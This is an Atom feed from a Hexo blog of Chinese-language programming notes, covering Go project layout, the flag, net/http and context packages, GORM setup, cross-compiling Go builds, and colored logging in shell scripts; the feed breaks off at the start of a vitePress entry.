<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LexLady</title>
  
  
  <link href="https://mulladylex.github.io/project/atom.xml" rel="self"/>
  
  <link href="https://mulladylex.github.io/project/"/>
  <updated>2025-08-24T03:11:18.362Z</updated>
  <id>https://mulladylex.github.io/project/</id>
  
  <author>
    <name>Lexlady</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Golang 项目布局</title>
    <link href="https://mulladylex.github.io/project/2025/08/25/Golang/go-layout/"/>
    <id>https://mulladylex.github.io/project/2025/08/25/Golang/go-layout/</id>
    <published>2025-08-25T06:45:56.000Z</published>
    <updated>2025-08-24T03:11:18.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Golang-项目布局"><a href="#Golang-项目布局" class="headerlink" title="Golang 项目布局"></a>Golang 项目布局</h1><p>在 Go 语言中，项目布局（Project Layout）是指如何组织和结构化代码文件和目录，以便于开发、维护和协作。一个良好的项目布局可以提高代码的可读性、可维护性和可扩展性。</p><h2 id="常见的项目布局结构"><a href="#常见的项目布局结构" class="headerlink" title="常见的项目布局结构"></a>常见的项目布局结构</h2><p>以下是一个常见的 Go 项目布局结构示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">myproject/<br>├── cmd/                # 主应用程序目录<br>│   └── myapp/         # 每个子目录对应一个可执行文件<br>│       └── main.go    # 主程序入口<br>├── pkg/                # 可重用的库代码<br>│   └── mylib/        # 每个子目录对应一个库<br>│       └── mylib.go   # 库代码<br>├── internal/          # 私有库代码，不能被外部使用<br>│   └── myinternal/   # 每个子目录对应一个私有库<br>│       └── myinternal.go # 私有库代码<br>├── api/                # API 定义和协议文件<br>│   └── v1/           # 版本化的 API<br>│       └── api.proto  # API 协议文件<br>├── web/                # Web 相关文件（HTML、CSS、JS）<br>│   └── static/       # 静态资源<br>│       └── style.css  # 样式文件<br>├── configs/           # 配置文件<br>│   └── config.yaml   # 配置文件<br>├── scripts/           # 构建和部署脚本<br>│   └── build.sh      # 构建脚本<br>├── test/              # 测试代码<br>│   └── myapp_test.go # 测试文件<br>├── go.mod             # Go 模块文件<br>├── go.sum             # Go 模块校验文件<br>└── README.md         # 项目说明文件<br></code></pre></td></tr></table></figure><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul><li><code>cmd/</code> 目录包含主应用程序的代码，每个子目录对应一个可执行文件。</li><li><code>pkg/</code> 目录包含可重用的库代码，可以被其他项目导入使用。</li><li><code>internal/</code> 目录包含私有库代码，这些代码只能在当前项目中使用，不能被外部项目导入。</li><li><code>api/</code> 目录包含 API 定义和协议文件，通常用于定义服务的接口。</li><li><code>web/</code> 目录包含与 Web 相关的文件，如 HTML、CSS 和 JavaScript。</li><li><code>configs/</code> 目录包含配置文件，用于存储应用程序的配 置参数。</li><li><code>scripts/</code> 目录包含构建和部署脚本，帮助自动化项目的构建和部署过程。</li><li><code>test/</code> 目录包含测试代码，用于验证应用程序的功能和性能。</li><li><code>go.mod</code> 和 <code>go.sum</code> 文件用于管理 Go 模块和依赖。</li><li><code>README.md</code> 文件用于提供项目的说明和文档。</li></ul><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul><li><a href="https://blog.kennycoder.io/2022/08/20/Golang-%E8%AB%87%E8%AB%87-project-layout/">https://blog.kennycoder.io/2022/08/20/Golang-%E8%AB%87%E8%AB%87-project-layout/</a></li><li></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Golang-项目布局&quot;&gt;&lt;a href=&quot;#Golang-项目布局&quot; class=&quot;headerlink&quot; title=&quot;Golang 项目布局&quot;&gt;&lt;/a&gt;Golang 项目布局&lt;/h1&gt;&lt;p&gt;在 Go 语言中，项目布局（Project Layout）是指如何组</summary>
      
    
    
    
    <category term="Golang" scheme="https://mulladylex.github.io/project/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>shell</title>
    <link href="https://mulladylex.github.io/project/2025/08/24/shell/"/>
    <id>https://mulladylex.github.io/project/2025/08/24/shell/</id>
    <published>2025-08-24T02:30:22.000Z</published>
    <updated>2025-08-24T02:39:04.531Z</updated>
    
    <content type="html"><![CDATA[<p>shell 脚本的学习与记录</p><p><strong>脚本开头</strong>通常需要指定解释器路径，例如：</p><p>常见的写法还有<code>#!/usr/bin/env bash</code>，这种写法可以在不同系统中更灵活地找到bash解释器的位置。</p><p>函数里<code>$1 `` $2</code>… 获取参数，<code>$@</code>获取所有参数。</p><p>彩色输出常量：</p><p>\033 表示 ANSI 转义序列，用于在终端里控制颜色。</p><p>0;31m → 红色<br>0;32m → 绿色<br>0;33m → 黄色</p><p>NC&#x3D;’\033[0m’ 用来重置颜色，避免后续输出都带颜色。</p><p>常见扩展：蓝色 0;34m，紫色 0;35m，青色 0;36m。</p><p><code>&gt;&amp;2</code>表示输出到**标准错误流 (stderr)**，方便脚本中区分错误和正常输出。</p><p>脚本示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">--- 彩色输出常量 ---</span><br>RED=&#x27;\033[0;31m&#x27;<br>GREEN=&#x27;\033[0;32m&#x27;<br>YELLOW=&#x27;\033[0;33m&#x27;<br>NC=&#x27;\033[0m&#x27; # No Color<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">--- 日志函数 ---</span><br>log_info() &#123;<br>    echo -e &quot;$&#123;GREEN&#125;[INFO] $(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;) ==&gt; $1$&#123;NC&#125;&quot;<br>&#125;<br><br>log_warn() &#123;<br>    echo -e &quot;$&#123;YELLOW&#125;[WARNING] $(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;) ==&gt; $1$&#123;NC&#125;&quot;<br>&#125;<br><br>log_error() &#123;<br>    echo -e &quot;$&#123;RED&#125;[ERROR] $(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;) ==&gt; $1$&#123;NC&#125;&quot; &gt;&amp;2<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;shell 脚本的学习与记录&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;脚本开头&lt;/strong&gt;通常需要指定解释器路径，例如：&lt;/p&gt;
&lt;p&gt;常见的写法还有&lt;code&gt;#!/usr/bin/env bash&lt;/code&gt;，这种写法可以在不同系统中更灵活地找到bash解释器的位置。&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>标准库——flag</title>
    <link href="https://mulladylex.github.io/project/2025/08/22/Golang/go-flag/"/>
    <id>https://mulladylex.github.io/project/2025/08/22/Golang/go-flag/</id>
    <published>2025-08-22T02:51:22.000Z</published>
    <updated>2025-08-22T02:55:57.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>Go 语言的 flag 包提供了一个简单的命令行参数解析器。它支持定义标志（flags），解析命令行参数，并生成帮助信息。</p><h1 id><a href="#" class="headerlink" title></a></h1><p>flag库的基本使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;flag&quot;</span><br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 定义命令行标志</span><br>    wordPtr := flag.String(<span class="hljs-string">&quot;word&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;a string&quot;</span>)<br>    numbPtr := flag.Int(<span class="hljs-string">&quot;numb&quot;</span>, <span class="hljs-number">42</span>, <span class="hljs-string">&quot;an int&quot;</span>)<br>    boolPtr := flag.Bool(<span class="hljs-string">&quot;fork&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;a bool&quot;</span>)<br><br>    <span class="hljs-comment">// 自定义标志</span><br>    <span class="hljs-keyword">var</span> svar <span class="hljs-type">string</span><br>    flag.StringVar(&amp;svar, <span class="hljs-string">&quot;svar&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;a string var&quot;</span>)<br><br>    <span class="hljs-comment">// 解析命令行标志</span><br>    flag.Parse()<br><br>    <span class="hljs-comment">// 输出标志的值</span><br>    fmt.Println(<span class="hljs-string">&quot;word:&quot;</span>, *wordPtr)<br>    fmt.Println(<span class="hljs-string">&quot;numb:&quot;</span>, *numbPtr)<br>    fmt.Println(<span class="hljs-string">&quot;fork:&quot;</span>, *boolPtr)<br>    fmt.Println(<span class="hljs-string">&quot;svar:&quot;</span>, svar)<br>    fmt.Println(<span class="hljs-string">&quot;tail:&quot;</span>, flag.Args())<br>&#125;<br></code></pre></td></tr></table></figure><p>不设置某个选项，相应变量会取默认值。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Abstract&quot;&gt;&lt;a href=&quot;#Abstract&quot; class=&quot;headerlink&quot; title=&quot;Abstract&quot;&gt;&lt;/a&gt;Abstract&lt;/h1&gt;&lt;p&gt;Go 语言的 flag 包提供了一个简单的命令行参数解析器。它支持定义标志（flags），解</summary>
      
    
    
    
    <category term="Golang" scheme="https://mulladylex.github.io/project/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>GO项目部署</title>
    <link href="https://mulladylex.github.io/project/2025/08/13/Golang/go-deploy/"/>
    <id>https://mulladylex.github.io/project/2025/08/13/Golang/go-deploy/</id>
    <published>2025-08-13T12:36:22.000Z</published>
    <updated>2025-08-13T12:52:48.017Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go-项目打包部署"><a href="#Go-项目打包部署" class="headerlink" title="Go 项目打包部署"></a>Go 项目打包部署</h1><h2 id="Go-build"><a href="#Go-build" class="headerlink" title="Go build"></a>Go build</h2><p>go build 是Golang提供的命令，会将main.go涉及到的文件都编译打包好，放在当前目录下，可以通过参数 -o 指定生成的二进制文件名。</p><p>可以打包成exe后缀文件，在Windows上直接运行</p><p>go build main.go</p><p>可以打包成二进制文件，在linux平台运行</p><p>这里通常需要使用两个变量，GOOS 目标操作系统，支持以下操作系统：<br>darwin freebsd linux windows android dragonfly netbsd openbsd plans solaris</p><p>GOARCH 目标处理器，支持以下处理器架构 arm64 arm 386 amd64 ppc64 ppc64le mips64 mips64le s390x</p><p>设置好后，就能够通过go build在当前目录下生成对应的可执行二进制文件了</p><p>通常可能需要使用 chmod 773 赋予文件权限 再进行执行。</p><p>一些编译参数</p><p>-x<br>-n<br>-a<br>-o<br>-p<br>-work<br>-race<br>-installsuffix</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Go-项目打包部署&quot;&gt;&lt;a href=&quot;#Go-项目打包部署&quot; class=&quot;headerlink&quot; title=&quot;Go 项目打包部署&quot;&gt;&lt;/a&gt;Go 项目打包部署&lt;/h1&gt;&lt;h2 id=&quot;Go-build&quot;&gt;&lt;a href=&quot;#Go-build&quot; class=&quot;</summary>
      
    
    
    
    <category term="Golang" scheme="https://mulladylex.github.io/project/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>GORM</title>
    <link href="https://mulladylex.github.io/project/2025/08/07/Golang/go-gorm/"/>
    <id>https://mulladylex.github.io/project/2025/08/07/Golang/go-gorm/</id>
    <published>2025-08-07T14:23:22.000Z</published>
    <updated>2025-08-07T14:52:46.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GORM是什么"><a href="#GORM是什么" class="headerlink" title="GORM是什么"></a>GORM是什么</h1><p>GORM是go中的ORM库，用于简化数据库操作。</p><p>快速上手GORM只需了解它的安装、连接、模型定义、创建表、CRUD操作</p><ol><li><p>安装GORM</p><p> 首先，使用<code>go get</code>命令安装GORM：</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">go get -u gorm.io/gorm<br>go get -u gorm.io/driver/mysql<br></code></pre></td></tr></table></figure><pre><code>上述命令会安装GORM以及MySql数据库驱动（如需使用其他数据库可查阅相关</code></pre><ol start="2"><li><p>连接数据库</p><p> 连接数据库的常见形式主要有以下几种：</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">dsn := <span class="hljs-string">&quot;user:password@tcp(127.0.0.1:3306)/database?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span><br>db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;failed to connect database&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>着重注意的就是<code>user</code>,<code>password</code>,<code>database</code>为自己的数据库用户名、登录密码、库名配置。<br>3. 定义模型<br>    模型是Go结构体，对应数据库表</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Product <span class="hljs-keyword">struct</span> &#123;<br>    gorm.Model<br>    Code <span class="hljs-type">string</span><br>    Price <span class="hljs-type">float64</span><br>&#125;<br></code></pre></td></tr></table></figure><pre><code>gorm.Model 包含了ID，CreateAt，UpdateAt，DelegateAt字段</code></pre><ol start="4"><li><p>自动迁移</p><p> Gorm 可以自动根据模型创建表</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">db.AutoMigrate(&amp;Product&#123;&#125;)<br></code></pre></td></tr></table></figure><ol start="5"><li><p>CRUD操作</p></li><li></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GORM是什么&quot;&gt;&lt;a href=&quot;#GORM是什么&quot; class=&quot;headerlink&quot; title=&quot;GORM是什么&quot;&gt;&lt;/a&gt;GORM是什么&lt;/h1&gt;&lt;p&gt;GORM是go中的ORM库，用于简化数据库操作。&lt;/p&gt;
&lt;p&gt;快速上手GORM只需了解它的安装、连</summary>
      
    
    
    
    <category term="Golang" scheme="https://mulladylex.github.io/project/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://mulladylex.github.io/project/2025/08/01/Golang/go-http/"/>
    <id>https://mulladylex.github.io/project/2025/08/01/Golang/go-http/</id>
    <published>2025-08-01T01:45:38.615Z</published>
    <updated>2025-08-01T01:45:46.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go语言Http包学习"><a href="#Go语言Http包学习" class="headerlink" title="Go语言Http包学习"></a>Go语言Http包学习</h1><p>go中net&#x2F;http包中，提供了HTTP客户端和服务端的实现。提供了HTTP通信过程中各种对象的定义及实现。</p><p>对于客户端，可以使用<code>Get</code>、<code>Post</code>、<code>Head</code>和<code>PostForm</code>等方法发送对应的HTTP请求，也可以通过Client类型自定义客户端，从而调用其中方法发送HTTP请求。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 直接发送请求，并接受响应</span><br>resp, err := http.Get(<span class="hljs-string">&quot;http://example.com&quot;</span>)<br>resp, err := http.PostForm(<span class="hljs-string">&quot;http://example.com&quot;</span>,<br>    url.Values&#123;<span class="hljs-string">&quot;key&quot;</span>: &#123;<span class="hljs-string">&quot;Value&quot;</span>&#125;, <span class="hljs-string">&quot;id&quot;</span>: &#123;<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;)<br><span class="hljs-comment">// 客户端必须显示关闭响应体</span><br><span class="hljs-keyword">defer</span> resp.Body.Close()<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 自定义客户端</span><br>client := &amp;http.Client&#123;<br>    Timeout: <span class="hljs-number">10</span> * time.Second, <span class="hljs-comment">// 设置超时时间</span><br>    CheckRedirect: redirectFunc,    <span class="hljs-comment">// 设置重定向处理函数</span><br>&#125;<br>resp, err := client.Get(<span class="hljs-string">&quot;http://example.com&quot;</span>)<br><br><span class="hljs-comment">// 也可以预生成请求，然后使用客户端发送</span><br>req, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://example.com&quot;</span>, <span class="hljs-literal">nil</span>)<br><span class="hljs-comment">// ...</span><br>req.Header.Add(<span class="hljs-string">&quot;If-None-Match&quot;</span>, <span class="hljs-string">&quot;abc123&quot;</span>)<br>resp, err := client.Do(req)<br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><p>对于传输过程，它提供了支持代理，TLS配置，keep-alive，压缩等传输方式的<code>Transport</code>类型。</p><p>对于服务端，它提供了<code>ListenAndServe</code>方法使用给定的地址和处理程序启动HTTP服务器，同时提供了<code>Server</code>类型用于自定义服务端及处理请求的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">http.Handle(<span class="hljs-string">&quot;/foo&quot;</span>, fooHandler)<br>http.HandleFunc(<span class="hljs-string">&quot;/bar&quot;</span>, barHandler)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Go语言Http包学习&quot;&gt;&lt;a href=&quot;#Go语言Http包学习&quot; class=&quot;headerlink&quot; title=&quot;Go语言Http包学习&quot;&gt;&lt;/a&gt;Go语言Http包学习&lt;/h1&gt;&lt;p&gt;go中net&amp;#x2F;http包中，提供了HTTP客户端和服务端的</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://mulladylex.github.io/project/2025/08/01/Golang/go-context/"/>
    <id>https://mulladylex.github.io/project/2025/08/01/Golang/go-context/</id>
    <published>2025-08-01T01:44:45.861Z</published>
    <updated>2025-08-01T01:45:08.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="了解Context"><a href="#了解Context" class="headerlink" title="了解Context"></a>了解Context</h1><p>控制并发的方法：<code>WaitGroup</code>、<code>context</code><br><code>WaitGroup</code>使用场景：将同一件事情拆成不同的工作执行，最后等待所有的工作完成才继续执行主程序。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup<br><br>    wg.Add(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        time.Sleep(<span class="hljs-number">2</span> * time.Second)<br>        fmt.Println(<span class="hljs-string">&quot;job 1 done.&quot;</span>)<br>        wg.Done()<br>    &#125;()<br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>        fmt.Println(<span class="hljs-string">&quot;job 2 done.&quot;</span>)<br>        wg.Done()<br>    &#125;()<br>    wg.Wait()<br>    fmt.Println(<span class="hljs-string">&quot;All Done.&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>主程序通过<code>wg.Wait()</code>等待所有job执行完成后才最后执行。</p><p>情景扩展：虽然将job拆成了多个后，并丢到后台进行运行，我该如何终止某个<code>goroutine</code>的工作呢？</p><p>：通过使用<code>channel+select</code>来主动通知并且停止正在运行的Job。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  stop := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><br>  <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> &#123;<br>      <span class="hljs-keyword">select</span> &#123;<br>        <span class="hljs-keyword">case</span> &lt;-stop:<br>          fmt.Println(<span class="hljs-string">&quot;got stop signal&quot;</span>)<br>          <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">default</span>:<br>          fmt.Println(<span class="hljs-string">&quot;still running&quot;</span>)<br>          time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>      &#125;<br>    &#125;<br>  &#125; ()<br><br>  time.Sleep(<span class="hljs-number">3</span> * time.Second)<br>  fmt.Println(<span class="hljs-string">&quot;stop the goroutine&quot;</span>)<br>  stop &lt;- <span class="hljs-literal">true</span><br>  time.Sleep(<span class="hljs-number">1</span> * time.Second) <span class="hljs-comment">// 等待goroutine结束</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在上述场景中，可以在任何地方将bool值丢入stop channel中，就可以停止正在运行的<code>goroutine</code>，但如果后台跑了多个<code>goroutine</code>，或者是在<code>goroutine</code>中又跑了<code>goroutine</code>，就没有办法用channel进行处理了。而是采用context。</p><p>拿上面的例子进行改写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  ctx, cancel := context.WithCancel(context.Background())<br><br>  <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      <span class="hljs-keyword">for</span> &#123;<br>        <span class="hljs-keyword">select</span> &#123;<br>          <span class="hljs-keyword">case</span> &lt;-ctx.Done():<br>            fmt.Println(<span class="hljs-string">&quot;got the stop channel&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>          <span class="hljs-keyword">default</span>:<br>            fmt.Println(<span class="hljs-string">&quot;still working&quot;</span>)<br>            time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>        &#125;<br>      &#125;<br>    &#125; ()<br><br>    time.Sleep(<span class="hljs-number">5</span> * time.Second)<br>    fmt.Println(<span class="hljs-string">&quot;stop the gorutine&quot;</span>)<br>    cancel()<br>    time.Sleep(<span class="hljs-number">5</span> * time.Second)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Context <span class="hljs-keyword">interface</span> &#123;<br>  Deadline() (deadline time.Time, ok <span class="hljs-type">bool</span>)<br>  Done() &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>  Err() <span class="hljs-type">error</span><br>  Value(key <span class="hljs-keyword">interface</span>&#123;&#125;) <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Deadline —— 返回context.Context被取消的时间。</li><li>Done —— 返回一个channel，会在当前工作完成或上下文被取消时关闭。</li><li><blockquote><p>多次调用Done方法会返回同一个channel。</p></blockquote></li><li>Err —— 返回context.Context结束的原因。只会在Done方法对应的channel关闭时返回非空值；</li><li><blockquote><p>如果context.Context被取消，返回<code>context.Canceled</code>；</p></blockquote></li><li><blockquote><p>如果超时，返回<code>context.DeadlineExceeded</code>。</p></blockquote></li><li>Value —— 从context.Context中获取键对应的值，对于同一个context来说，多次调用Value并传入相同的Key会返回相同的结果。</li></ul><h2 id="设计原理"><a href="#设计原理" class="headerlink" title="设计原理"></a>设计原理</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;了解Context&quot;&gt;&lt;a href=&quot;#了解Context&quot; class=&quot;headerlink&quot; title=&quot;了解Context&quot;&gt;&lt;/a&gt;了解Context&lt;/h1&gt;&lt;p&gt;控制并发的方法：&lt;code&gt;WaitGroup&lt;/code&gt;、&lt;code&gt;conte</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vitePress</title>
    <link href="https://mulladylex.github.io/project/2025/07/29/vitePress/"/>
    <id>https://mulladylex.github.io/project/2025/07/29/vitePress/</id>
    <published>2025-07-29T04:03:50.000Z</published>
    <updated>2025-07-29T04:38:25.777Z</updated>
    
